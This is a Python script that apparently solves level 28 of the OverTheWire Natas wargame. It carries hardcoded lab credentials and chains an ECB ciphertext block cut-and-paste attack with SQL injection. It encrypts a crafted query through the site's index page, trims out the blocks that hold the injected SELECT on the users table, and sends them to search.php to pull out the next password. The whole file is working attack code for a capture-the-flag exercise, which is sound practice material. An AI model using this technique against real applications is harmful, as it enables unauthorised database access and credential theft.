import requests, base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
auth = ("natas28", "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3")

PREFIX = 38
FILLER = (16 - (PREFIX % 16)) % 16  # = 10

our_query = "SELECT password as joke FROM users WHERE username=0x6e617461733239"
pad_needed = (16 - len(our_query) % 16) % 16
our_query_padded = our_query + " " * pad_needed

plaintext = "a" * FILLER + our_query_padded + chr(16) * 16

resp = requests.post(url, auth=auth, data={"query": plaintext}, allow_redirects=False)
location = resp.headers.get("Location", "")
encoded = location.split("query=")[1]
full_ciphertext = base64.b64decode(encoded.replace("%2B","+").replace("%2F","/").replace("%3D","="))

query_start_byte = PREFIX + FILLER
query_len_padded = len(our_query_padded) + 16
trimmed = full_ciphertext[query_start_byte : query_start_byte + query_len_padded]

final_payload = base64.b64encode(trimmed)
result = requests.get(search_url, auth=auth, params={"query": final_payload})
print(result.text)

